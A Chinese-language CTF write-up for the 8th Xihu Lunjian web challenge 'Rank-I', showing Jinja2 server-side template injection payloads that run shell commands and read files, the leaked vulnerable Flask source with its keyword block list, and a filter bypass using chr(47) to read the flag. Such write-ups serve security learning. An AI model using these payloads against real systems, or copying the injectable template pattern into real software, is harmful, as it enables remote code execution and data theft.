---
title: "第八届西湖论剑"
date: 2025-01-18
draft: false
description: "第八届西湖论剑"
summary: "第八届西湖论剑 个人WriteUP"
tags: ["writeup", "ctf"]
categories: ["writeup"]
---

## WEB

### Rank-I

尝试rce

```
{{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['eval']('__import__("os").popen("ls ..").read()')}}
```

```
app
bin
boot
dev
etc
flagf149
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
```

得知根目录下有flagf419文件应该是flag，直接读取读不了

```
{{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['eval']('open("app.py").read()')}}
```

拿到源代码:

```python
from flask import Flask, request, render_template, render_template_string, redirect, url_for, abort
from urllib.parse import unquote

app = Flask(__name__)

phone = ''

def is_safe_input(user_input):
    # unsafe_keywords = ['eval', 'exec', 'os', 'system', 'import', '__import__']
    unsafe_keywords = ['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']
    if any(keyword in user_input for keyword in unsafe_keywords):
    # if user_input in unsafe_keywords:
        return True
    return False

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    global phone
    phone = request.form.get("phone_number")
    return render_template("login.html")

@app.route("/cpass", methods=["POST"])
def check():
    global phone
    password = request.form.get("password")

    if is_safe_input(phone):
        return redirect(url_for('index'))

    if phone != "1686682318" and password != "Happy_news_admin":
        return render_template_string('<!DOCTYPE html>\
        <html lang="en">\
        <head>\
            <meta charset="UTF-8">\
            <title>login failed</title>\
        </head>\
        <body>\
            <script>alert("{}The number does not exist or the password is incorrect!") </script>\
            <script>window.location.href = "/";</script>\
        </body>\
        </html>'.format(phone))
    else:
        return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=int("5005"), debug=True)
```

查看源码发现过滤了```['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']```

```
{{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['eval']('open(chr(47)+"fla"+"gf149").read()')}}
```

拿到flag

> DASCTF{49467766377144059055627981055717}
